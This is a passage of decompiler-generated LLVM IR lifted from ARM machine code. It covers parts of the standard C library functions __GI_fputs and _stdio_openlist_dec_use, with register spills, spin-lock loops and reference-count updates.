dec_label_pc_cc68:                                ; preds = %dec_label_pc_cbf4, %dec_label_pc_cbd8, %dec_label_pc_cc50, %dec_label_pc_cc48
  %v0_cc68 = load i32, i32* %r8.global-to-local, align 4
  %v2_cc6c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_cc6c, i32* @r4, align 4
  store i32 %v6_cb58, i32* @r5, align 4
  store i32 %v9_cb58, i32* @r6, align 4
  store i32 %v12_cb58, i32* @r7, align 4
  store i32 %v15_cb58, i32* @r8, align 4
  store i32 %v24_cb58, i32* @lr, align 4
  ret i32 %v0_cc68

; uselistorder directives
  uselistorder i32 %v0_cc3c, { 1, 0, 2 }
  uselistorder i32 %v1_cc20.pre, { 0, 2, 1 }
  uselistorder i32 %v0_cbe0, { 1, 0 }
  uselistorder i32 %v1_cb9c.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 11, 10, 0, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 10, 9, 0, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_cc68, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_cc40, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cc28, { 1, 0 }
  uselistorder label %dec_label_pc_cbd8, { 1, 0 }
  uselistorder label %dec_label_pc_cbcc, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_cbbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cba4, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_cc74 = load i32, i32* @r4, align 4
  store i32 %v3_cc74, i32* %stack_var_-28, align 4
  %v6_cc74 = load i32, i32* @r5, align 4
  %v9_cc74 = load i32, i32* @r6, align 4
  %v12_cc74 = load i32, i32* @r7, align 4
  %v15_cc74 = load i32, i32* @r8, align 4
  %v18_cc74 = load i32, i32* @sl, align 4
  %v21_cc74 = load i32, i32* @lr, align 4
  %v1_cc78 = add i32 %arg2, 52
  %v2_cc78 = inttoptr i32 %v1_cc78 to i32*
  %v3_cc78 = load i32, i32* %v2_cc78, align 4
  store i32 %v3_cc78, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cc7c = icmp eq i32 %v3_cc78, 0
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg1, i32* @sl, align 4
  br i1 %v2_cc7c, label %dec_label_pc_cc90, label %dec_label_pc_ccf4

dec_label_pc_cc90:                                ; preds = %entry
  %v0_cc90 = call i32 @__aeabi_read_tp()
  %v1_cc94 = add i32 %arg2, 64
  %v2_cc94 = inttoptr i32 %v1_cc94 to i32*
  %v3_cc94 = load i32, i32* %v2_cc94, align 4
  store i32 %v3_cc94, i32* %r3.global-to-local, align 4
  %v1_cc98 = add i32 %v0_cc90, -1168
  store i32 %v1_cc98, i32* @r8, align 4
  %v3_cc9c = icmp uge i32 %v3_cc94, %v1_cc98
  store i1 %v3_cc9c, i1* %cpsr_c.global-to-local, align 1
  %v9_cc9c = icmp eq i32 %v3_cc94, %v1_cc98
  br i1 %v9_cc9c, label %dec_label_pc_cce8, label %dec_label_pc_cca4

dec_label_pc_cca4:                                ; preds = %dec_label_pc_cc90
  %v1_cca4 = add i32 %arg2, 56
  store i32 %v1_cca4, i32* @r5, align 4
  store i32 %v1_cca4, i32* %r2.global-to-local, align 4
  %v0_ccb0 = load i32, i32* @r6, align 4
  store i32 %v0_ccb0, i32* @r4, align 4
  %v1_ccb435 = inttoptr i32 %v1_cca4 to i32*
  %v2_ccb436 = load i32, i32* %v1_ccb435, align 4
  store i32 %v2_ccb436, i32* %r3.global-to-local, align 4
  %v3_ccb838 = icmp uge i32 %v2_ccb436, %v0_ccb0
  store i1 %v3_ccb838, i1* %cpsr_c.global-to-local, align 1
  %v9_ccb844 = icmp eq i32 %v2_ccb436, %v0_ccb0
  br i1 %v9_ccb844, label %dec_label_pc_ccc0, label %dec_label_pc_ccd8

dec_label_pc_ccc0:                                ; preds = %dec_label_pc_cca4, %dec_label_pc_ccc0.dec_label_pc_ccb4_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_ccd0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ccd0, label %dec_label_pc_ccd4, label %dec_label_pc_ccc0.dec_label_pc_ccb4_crit_edge

dec_label_pc_ccc0.dec_label_pc_ccb4_crit_edge:    ; preds = %dec_label_pc_ccc0
  %v0_ccb4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ccb8.pre = load i32, i32* @r4, align 4
  %v1_ccb4 = inttoptr i32 %v0_ccb4.pre to i32*
  %v2_ccb4 = load i32, i32* %v1_ccb4, align 4
  store i32 %v2_ccb4, i32* %r3.global-to-local, align 4
  %v3_ccb8 = icmp uge i32 %v2_ccb4, %v1_ccb8.pre
  store i1 %v3_ccb8, i1* %cpsr_c.global-to-local, align 1
  %v9_ccb8 = icmp eq i32 %v2_ccb4, %v1_ccb8.pre
  br i1 %v9_ccb8, label %dec_label_pc_ccc0, label %dec_label_pc_ccd8

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_ccc0
  %v0_ccd4 = load i32, i32* @r4, align 4
  store i32 %v0_ccd4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ccd8

dec_label_pc_ccd8:                                ; preds = %dec_label_pc_cca4, %dec_label_pc_ccc0.dec_label_pc_ccb4_crit_edge, %dec_label_pc_ccd4
  %v0_ccd8 = phi i32 [ %v0_ccd4, %dec_label_pc_ccd4 ], [ %v2_ccb436, %dec_label_pc_cca4 ], [ %v2_ccb4, %dec_label_pc_ccc0.dec_label_pc_ccb4_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ccd8 = icmp eq i32 %v0_ccd8, 0
  br i1 %v2_ccd8, label %bb19, label %bb

bb:                                               ; preds = %dec_label_pc_ccd8
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_ccd8, %bb
  store i32 52452, i32* @lr, align 4
  %v1_cce0 = xor i1 %v2_ccd8, true
  call void @__pseudo_cond_branch(i1 %v1_cce0, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_cce4 = load i32, i32* @r8, align 4
  %v1_cce4 = load i32, i32* @r7, align 4
  %v2_cce4 = add i32 %v1_cce4, 64
  %v3_cce4 = inttoptr i32 %v2_cce4 to i32*
  store i32 %v0_cce4, i32* %v3_cce4, align 4
  br label %dec_label_pc_cce8

dec_label_pc_cce8:                                ; preds = %dec_label_pc_cc90, %bb19
  %v0_cce8 = load i32, i32* @r7, align 4
  %v1_cce8 = add i32 %v0_cce8, 60
  %v2_cce8 = inttoptr i32 %v1_cce8 to i32*
  %v3_cce8 = load i32, i32* %v2_cce8, align 4
  %v1_ccec = add i32 %v3_cce8, 1
  store i32 %v1_ccec, i32* %r3.global-to-local, align 4
  store i32 %v1_ccec, i32* %v2_cce8, align 4
  %v0_ccf4.pre = load i32, i32* @sl, align 4
  %v0_ccf8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ccf4

dec_label_pc_ccf4:                                ; preds = %entry, %dec_label_pc_cce8
  %v0_ccf8 = phi i32 [ %arg2, %entry ], [ %v0_ccf8.pre, %dec_label_pc_cce8 ]
  %v0_ccf4 = phi i32 [ %arg1, %entry ], [ %v0_ccf4.pre, %dec_label_pc_cce8 ]
  %v2_ccfc = inttoptr i32 %v0_ccf4 to i8*
  %v3_ccfc = call i32 @__GI_fputs_unlocked(i8* %v2_ccfc, i32 %v0_ccf8)
  %v0_cd00 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cd00 = icmp eq i32 %v0_cd00, 0
  store i32 %v3_ccfc, i32* %r8.global-to-local, align 4
  br i1 %v2_cd00, label %dec_label_pc_cd0c, label %dec_label_pc_cd80

dec_label_pc_cd0c:                                ; preds = %dec_label_pc_ccf4
  %v0_cd0c = load i32, i32* @r7, align 4
  %v1_cd0c = add i32 %v0_cd0c, 60
  %v2_cd0c = inttoptr i32 %v1_cd0c to i32*
  %v3_cd0c = load i32, i32* %v2_cd0c, align 4
  %v1_cd10 = add i32 %v3_cd0c, -1
  store i32 %v1_cd10, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cd14 = icmp eq i32 %v1_cd10, 0
  store i32 %v1_cd10, i32* %v2_cd0c, align 4
  br i1 %v2_cd14, label %dec_label_pc_cd20, label %dec_label_pc_cd80

dec_label_pc_cd20:                                ; preds = %dec_label_pc_cd0c
  %v0_cd20 = load i32, i32* %r3.global-to-local, align 4
  %v1_cd20 = load i32, i32* @r7, align 4
  %v2_cd20 = add i32 %v1_cd20, 64
  %v3_cd20 = inttoptr i32 %v2_cd20 to i32*
  store i32 %v0_cd20, i32* %v3_cd20, align 4
  %v0_cd24 = load i32, i32* @r7, align 4
  %v1_cd24 = add i32 %v0_cd24, 56
  store i32 %v1_cd24, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_cd28

dec_label_pc_cd28:                                ; preds = %dec_label_pc_cd58.dec_label_pc_cd28_crit_edge, %dec_label_pc_cd20
  %v0_cd30 = phi i32 [ %v0_cd30.pre, %dec_label_pc_cd58.dec_label_pc_cd28_crit_edge ], [ %v1_cd24, %dec_label_pc_cd20 ]
  %v0_cd28 = phi i32 [ %v0_cd28.pre, %dec_label_pc_cd58.dec_label_pc_cd28_crit_edge ], [ %v0_cd24, %dec_label_pc_cd20 ]
  %v1_cd28 = add i32 %v0_cd28, 56
  %v2_cd28 = inttoptr i32 %v1_cd28 to i32*
  %v3_cd28 = load i32, i32* %v2_cd28, align 4
  store i32 %v3_cd28, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_cd30, i32* %r2.global-to-local, align 4
  %v1_cd3423 = inttoptr i32 %v0_cd30 to i32*
  %v2_cd3424 = load i32, i32* %v1_cd3423, align 4
  store i32 %v2_cd3424, i32* %r3.global-to-local, align 4
  %v3_cd3826 = icmp uge i32 %v2_cd3424, %v3_cd28
  store i1 %v3_cd3826, i1* %cpsr_c.global-to-local, align 1
  %v9_cd3832 = icmp eq i32 %v2_cd3424, %v3_cd28
  br i1 %v9_cd3832, label %dec_label_pc_cd40, label %dec_label_pc_cd58

dec_label_pc_cd40:                                ; preds = %dec_label_pc_cd28, %dec_label_pc_cd40.dec_label_pc_cd34_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_cd50 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_cd50, label %dec_label_pc_cd54, label %dec_label_pc_cd40.dec_label_pc_cd34_crit_edge

dec_label_pc_cd40.dec_label_pc_cd34_crit_edge:    ; preds = %dec_label_pc_cd40
  %v0_cd34.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_cd38.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_cd34 = inttoptr i32 %v0_cd34.pre to i32*
  %v2_cd34 = load i32, i32* %v1_cd34, align 4
  store i32 %v2_cd34, i32* %r3.global-to-local, align 4
  %v3_cd38 = icmp uge i32 %v2_cd34, %v1_cd38.pre
  store i1 %v3_cd38, i1* %cpsr_c.global-to-local, align 1
  %v9_cd38 = icmp eq i32 %v2_cd34, %v1_cd38.pre
  br i1 %v9_cd38, label %dec_label_pc_cd40, label %dec_label_pc_cd58

dec_label_pc_cd54:                                ; preds = %dec_label_pc_cd40
  %v0_cd54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_cd54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cd58

dec_label_pc_cd58:                                ; preds = %dec_label_pc_cd28, %dec_label_pc_cd40.dec_label_pc_cd34_crit_edge, %dec_label_pc_cd54
  %v0_cd60 = phi i32 [ %v0_cd54, %dec_label_pc_cd54 ], [ %v2_cd3424, %dec_label_pc_cd28 ], [ %v2_cd34, %dec_label_pc_cd40.dec_label_pc_cd34_crit_edge ]
  %v1_cd58 = phi i32 [ %v0_cd54, %dec_label_pc_cd54 ], [ %v3_cd28, %dec_label_pc_cd28 ], [ %v1_cd38.pre, %dec_label_pc_cd40.dec_label_pc_cd34_crit_edge ]
  %v3_cd58 = icmp uge i32 %v0_cd60, %v1_cd58
  store i1 %v3_cd58, i1* %cpsr_c.global-to-local, align 1
  %v9_cd58 = icmp eq i32 %v0_cd60, %v1_cd58
  br i1 %v9_cd58, label %dec_label_pc_cd60, label %dec_label_pc_cd58.dec_label_pc_cd28_crit_edge

dec_label_pc_cd58.dec_label_pc_cd28_crit_edge:    ; preds = %dec_label_pc_cd58
  %v0_cd28.pre = load i32, i32* @r7, align 4
  %v0_cd30.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_cd28

dec_label_pc_cd60:                                ; preds = %dec_label_pc_cd58
  %v2_cd60 = icmp ne i32 %v1_cd58, 0
  store i1 %v2_cd60, i1* %cpsr_c.global-to-local, align 1
  %v7_cd64 = icmp slt i32 %v1_cd58, 2
  br i1 %v7_cd64, label %dec_label_pc_cd80, label %dec_label_pc_cd68

dec_label_pc_cd68:                                ; preds = %dec_label_pc_cd60
  %v0_cd6c = load i32, i32* @r1, align 4
  %v1_cd6c = add i32 %v0_cd6c, 129
  store i32 %v1_cd6c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cd80

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd0c, %dec_label_pc_ccf4, %dec_label_pc_cd68, %dec_label_pc_cd60
  %v0_cd80 = load i32, i32* %r8.global-to-local, align 4
  %v2_cd88 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_cd88, i32* @r4, align 4
  store i32 %v6_cc74, i32* @r5, align 4
  store i32 %v9_cc74, i32* @r6, align 4
  store i32 %v12_cc74, i32* @r7, align 4
  store i32 %v15_cc74, i32* @r8, align 4
  store i32 %v18_cc74, i32* @sl, align 4
  store i32 %v21_cc74, i32* @lr, align 4
  ret i32 %v0_cd80

; uselistorder directives
  uselistorder i32 %v0_cd54, { 1, 0, 2 }
  uselistorder i32 %v1_cd38.pre, { 0, 2, 1 }
  uselistorder i32 %v1_ccb8.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 9, 10, 7, 8 }
  uselistorder i32 %arg2, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_cd80, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_cd58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cd40, { 1, 0 }
  uselistorder label %dec_label_pc_ccf4, { 1, 0 }
  uselistorder label %dec_label_pc_cce8, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_ccd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ccc0, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_cd90 = load i32, i32* @r4, align 4
  store i32 %v3_cd90, i32* %stack_var_-20, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r5.global-to-local, align 4
  %v4_cda0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 168) to i32*), align 4
  store i32 %v4_cda0, i32* %r7.global-to-local, align 4
  %v0_cda4 = call i32 @__aeabi_read_tp()
  store i32 %v0_cda4, i32* %r0.global-to-local, align 4
  %v1_cda8 = add i32 %v4_cda0, 8
  %v2_cda8 = inttoptr i32 %v1_cda8 to i32*
  %v3_cda8 = load i32, i32* %v2_cda8, align 4
  store i32 %v3_cda8, i32* %r3.global-to-local, align 4
  %v1_cdac = add i32 %v0_cda4, -1168
  store i32 %v1_cdac, i32* %r6.global-to-local, align 4
  %v3_cdb0 = icmp uge i32 %v3_cda8, %v1_cdac
  store i1 %v3_cdb0, i1* %cpsr_c.global-to-local, align 1
  %v9_cdb0 = icmp eq i32 %v3_cda8, %v1_cdac
  br i1 %v9_cdb0, label %dec_label_pc_cdfc, label %dec_label_pc_cdbc

dec_label_pc_cdbc:                                ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_cda0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_cdc893 = inttoptr i32 %v4_cda0 to i32*
  %v2_cdc894 = load i32, i32* %v1_cdc893, align 4
  store i32 %v2_cdc894, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_cdcc96 = icmp eq i32 %v2_cdc894, 0
  br i1 %v9_cdcc96, label %dec_label_pc_cdd4, label %dec_label_pc_cdec

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cdbc, %dec_label_pc_cdd4.dec_label_pc_cdc8_crit_edge
  %v0_cdd497 = phi i32 [ %v1_cdcc.pre, %dec_label_pc_cdd4.dec_label_pc_cdc8_crit_edge ], [ 0, %dec_label_pc_cdbc ]
  store i32 %v0_cdd497, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_cde4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_cde4, label %dec_label_pc_cde8, label %dec_label_pc_cdd4.dec_label_pc_cdc8_crit_edge

dec_label_pc_cdd4.dec_label_pc_cdc8_crit_edge:    ; preds = %dec_label_pc_cdd4
  %v0_cdc8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_cdcc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_cdc8 = inttoptr i32 %v0_cdc8.pre to i32*
  %v2_cdc8 = load i32, i32* %v1_cdc8, align 4
  store i32 %v2_cdc8, i32* %r3.global-to-local, align 4
  %v3_cdcc = icmp uge i32 %v2_cdc8, %v1_cdcc.pre
  store i1 %v3_cdcc, i1* %cpsr_c.global-to-local, align 1
  %v9_cdcc = icmp eq i32 %v2_cdc8, %v1_cdcc.pre
  br i1 %v9_cdcc, label %dec_label_pc_cdd4, label %dec_label_pc_cdec

dec_label_pc_cde8:                                ; preds = %dec_label_pc_cdd4
  %v0_cde8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_cde8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cdec

dec_label_pc_cdec:                                ; preds = %dec_label_pc_cdbc, %dec_label_pc_cdd4.dec_label_pc_cdc8_crit_edge, %dec_label_pc_cde8
  %v0_cdec = phi i32 [ %v0_cde8, %dec_label_pc_cde8 ], [ %v2_cdc894, %dec_label_pc_cdbc ], [ %v2_cdc8, %dec_label_pc_cdd4.dec_label_pc_cdc8_crit_edge ]
  %v1_cdec = phi i32 [ %v0_cde8, %dec_label_pc_cde8 ], [ 0, %dec_label_pc_cdbc ], [ %v1_cdcc.pre, %dec_label_pc_cdd4.dec_label_pc_cdc8_crit_edge ]
  %v3_cdec = icmp uge i32 %v0_cdec, %v1_cdec
  store i1 %v3_cdec, i1* %cpsr_c.global-to-local, align 1
  %v9_cdec = icmp eq i32 %v0_cdec, %v1_cdec
  br i1 %v9_cdec, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_cdec
  %v1_cdf0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_cdf0, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_cdec, %bb
  %v1_cdf4 = xor i1 %v9_cdec, true
  call void @__pseudo_cond_branch(i1 %v1_cdf4, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_cdf8 = load i32, i32* %r6.global-to-local, align 4
  %v1_cdf8 = load i32, i32* %r7.global-to-local, align 4
  %v2_cdf8 = add i32 %v1_cdf8, 8
  %v3_cdf8 = inttoptr i32 %v2_cdf8 to i32*
  store i32 %v0_cdf8, i32* %v3_cdf8, align 4
  br label %dec_label_pc_cdfc

dec_label_pc_cdfc:                                ; preds = %entry, %bb45
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_ce00 = load i32, i32* %r5.global-to-local, align 4
  %v2_ce00 = add i32 %v0_ce00, 168
  %v3_ce00 = inttoptr i32 %v2_ce00 to i32*
  %v4_ce00 = load i32, i32* %v3_ce00, align 4
  store i32 %v4_ce00, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_ce08 = add i32 %v0_ce00, 12
  %v3_ce08 = inttoptr i32 %v2_ce08 to i32*
  %v4_ce08 = load i32, i32* %v3_ce08, align 4
  store i32 %v4_ce08, i32* %r3.global-to-local, align 4
  %v1_ce0c = inttoptr i32 %v4_ce08 to i32*
  %v2_ce0c = load i32, i32* %v1_ce0c, align 4
  store i32 %v2_ce0c, i32* %r1.global-to-local, align 4
  %v1_ce10 = add i32 %v4_ce00, 4
  %v2_ce10 = inttoptr i32 %v1_ce10 to i32*
  %v3_ce10 = load i32, i32* %v2_ce10, align 4
  %v2_ce14 = icmp ne i32 %v2_ce0c, 0
  store i1 %v2_ce14, i1* %cpsr_c.global-to-local, align 1
  %v7_ce14 = icmp eq i32 %v2_ce0c, 1
  %v1_ce18 = add i32 %v3_ce10, 1
  store i32 %v1_ce18, i32* %r3.global-to-local, align 4
  store i32 %v1_ce18, i32* %v2_ce10, align 4
  br i1 %v7_ce14, label %dec_label_pc_ce24, label %dec_label_pc_cf88

dec_label_pc_ce24:                                ; preds = %dec_label_pc_cdfc
  store i32 88, i32* %r3.global-to-local, align 4
  %v0_ce28 = load i32, i32* %r5.global-to-local, align 4
  %v2_ce28 = add i32 %v0_ce28, 88
  %v3_ce28 = inttoptr i32 %v2_ce28 to i32*
  %v4_ce28 = load i32, i32* %v3_ce28, align 4
  store i32 %v4_ce28, i32* %r3.global-to-local, align 4
  %v1_ce2c = inttoptr i32 %v4_ce28 to i32*
  %v2_ce2c = load i32, i32* %v1_ce2c, align 4
  store i32 %v2_ce2c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_ce2c, 1
  br i1 %tmp46, label %dec_label_pc_cf88, label %dec_label_pc_ce38

dec_label_pc_ce38:                                ; preds = %dec_label_pc_ce24
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_ce3c = add i32 %v0_ce28, 160
  %v3_ce3c = inttoptr i32 %v2_ce3c to i32*
  %v4_ce3c = load i32, i32* %v3_ce3c, align 4
  store i32 %v4_ce3c, i32* %r7.global-to-local, align 4
  %v1_ce40 = add i32 %v4_ce3c, 8
  %v2_ce40 = inttoptr i32 %v1_ce40 to i32*
  %v3_ce40 = load i32, i32* %v2_ce40, align 4
  store i32 %v3_ce40, i32* %r3.global-to-local, align 4
  %v1_ce44 = load i32, i32* %r6.global-to-local, align 4
  %v3_ce44 = icmp uge i32 %v3_ce40, %v1_ce44
  store i1 %v3_ce44, i1* %cpsr_c.global-to-local, align 1
  %v9_ce44 = icmp eq i32 %v3_ce40, %v1_ce44
  br i1 %v9_ce44, label %dec_label_pc_ce88, label %dec_label_pc_ce4c

dec_label_pc_ce4c:                                ; preds = %dec_label_pc_ce38
  store i32 %v4_ce3c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_ce5486 = inttoptr i32 %v4_ce3c to i32*
  %v2_ce5487 = load i32, i32* %v1_ce5486, align 4
  store i32 %v2_ce5487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_ce5889 = icmp eq i32 %v2_ce5487, 0
  br i1 %v9_ce5889, label %dec_label_pc_ce60, label %dec_label_pc_ce78

dec_label_pc_ce60:                                ; preds = %dec_label_pc_ce4c, %dec_label_pc_ce60.dec_label_pc_ce54_crit_edge
  %v0_ce6090 = phi i32 [ %v1_ce58.pre, %dec_label_pc_ce60.dec_label_pc_ce54_crit_edge ], [ 0, %dec_label_pc_ce4c ]
  store i32 %v0_ce6090, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_ce70 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ce70, label %dec_label_pc_ce74, label %dec_label_pc_ce60.dec_label_pc_ce54_crit_edge

dec_label_pc_ce60.dec_label_pc_ce54_crit_edge:    ; preds = %dec_label_pc_ce60
  %v0_ce54.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ce58.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_ce54 = inttoptr i32 %v0_ce54.pre to i32*
  %v2_ce54 = load i32, i32* %v1_ce54, align 4
  store i32 %v2_ce54, i32* %r3.global-to-local, align 4
  %v3_ce58 = icmp uge i32 %v2_ce54, %v1_ce58.pre
  store i1 %v3_ce58, i1* %cpsr_c.global-to-local, align 1
  %v9_ce58 = icmp eq i32 %v2_ce54, %v1_ce58.pre
  br i1 %v9_ce58, label %dec_label_pc_ce60, label %dec_label_pc_ce78

dec_label_pc_ce74:                                ; preds = %dec_label_pc_ce60
  %v0_ce74 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ce74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ce78

dec_label_pc_ce78:                                ; preds = %dec_label_pc_ce4c, %dec_label_pc_ce60.dec_label_pc_ce54_crit_edge, %dec_label_pc_ce74
  %v0_ce78 = phi i32 [ %v0_ce74, %dec_label_pc_ce74 ], [ %v2_ce5487, %dec_label_pc_ce4c ], [ %v2_ce54, %dec_label_pc_ce60.dec_label_pc_ce54_crit_edge ]
  %v1_ce78 = phi i32 [ %v0_ce74, %dec_label_pc_ce74 ], [ 0, %dec_label_pc_ce4c ], [ %v1_ce58.pre, %dec_label_pc_ce60.dec_label_pc_ce54_crit_edge ]
  %v3_ce78 = icmp uge i32 %v0_ce78, %v1_ce78
  store i1 %v3_ce78, i1* %cpsr_c.global-to-local, align 1
  %v9_ce78 = icmp eq i32 %v0_ce78, %v1_ce78
  br i1 %v9_ce78, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_ce78
  %v1_ce7c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_ce7c, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_ce78, %bb47
  %v1_ce80 = xor i1 %v9_ce78, true
  call void @__pseudo_cond_branch(i1 %v1_ce80, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_ce84 = load i32, i32* %r6.global-to-local, align 4
  %v1_ce84 = load i32, i32* %r7.global-to-local, align 4
  %v2_ce84 = add i32 %v1_ce84, 8
  %v3_ce84 = inttoptr i32 %v2_ce84 to i32*
  store i32 %v0_ce84, i32* %v3_ce84, align 4
  %v0_ce90.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ce88

dec_label_pc_ce88:                                ; preds = %dec_label_pc_ce38, %bb48
  %v0_ce90 = phi i32 [ %v0_ce28, %dec_label_pc_ce38 ], [ %v0_ce90.pre, %bb48 ]
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 84, i32* %r1.global-to-local, align 4
  %v2_ce90 = add i32 %v0_ce90, 160
  %v3_ce90 = inttoptr i32 %v2_ce90 to i32*
  %v4_ce90 = load i32, i32* %v3_ce90, align 4
  store i32 %v4_ce90, i32* %r0.global-to-local, align 4
  %v2_ce94 = add i32 %v0_ce90, 84
  %v3_ce94 = inttoptr i32 %v2_ce94 to i32*
  %v4_ce94 = load i32, i32* %v3_ce94, align 4
  store i32 %v4_ce94, i32* %r2.global-to-local, align 4
  %v1_ce98 = add i32 %v4_ce90, 4
  %v2_ce98 = inttoptr i32 %v1_ce98 to i32*
  %v3_ce98 = load i32, i32* %v2_ce98, align 4
  store i32 %v3_ce98, i32* %r3.global-to-local, align 4
  %v1_ce9c = inttoptr i32 %v4_ce94 to i32*
  %v2_ce9c = load i32, i32* %v1_ce9c, align 4
  store i32 %v2_ce9c, i32* %r2.global-to-local, align 4
  %v1_cea0 = add i32 %v3_ce98, 1
  store i32 %v1_cea0, i32* %r3.global-to-local, align 4
  store i32 84, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_cea0, i32* %v2_ce98, align 4
  %v0_cef0.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_cef011 = icmp eq i32 %v0_cef0.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
